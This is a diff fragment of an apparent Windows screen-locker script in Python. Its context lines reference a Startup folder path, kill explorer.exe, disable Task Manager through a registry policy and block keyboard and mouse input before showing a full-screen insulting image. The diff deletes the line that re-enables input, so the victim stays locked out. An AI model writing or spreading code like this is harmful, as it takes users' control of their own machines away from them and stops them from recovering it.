@@ -8,7 +8,6 @@ file1=r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\{1}\Programs\Startup".for
 def main():
     os.system('taskkill /f /im explorer.exe & REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
     ok = windll.user32.BlockInput(True)
-    ok = windll.user32.BlockInput(False)
     import cv2
     img = cv2.imread(r"C:\Windows\nmsl.png")     
     out_win = "output_style_full_screen"
